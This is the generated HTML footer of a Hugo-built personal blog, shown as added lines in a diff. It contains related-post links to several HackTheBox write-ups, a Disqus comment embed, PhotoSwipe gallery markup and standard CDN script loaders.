+                <img src="/p/hackthebox-pilgrimage/Pilgrimage.a429f8be38cd5289d8586e659edf33e2_hu469812373868972083.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Pilgrimage"
+                        
+                        data-hash="md5-pCn4vjjNUonYWG5lnt8z4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Pilgrimage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-format/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hu12179815748093413314.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format"
+                        
+                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Format</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hu13502282750288352538.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-agile/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-agile/Agile.e64eb2d34a7a6346f24c5fd437dde6f0_hu6397349716716905999.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile"
+                        
+                        data-hash="md5-5k6y00p6Y0byTF/UN93m8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Agile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12638892371061536788.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
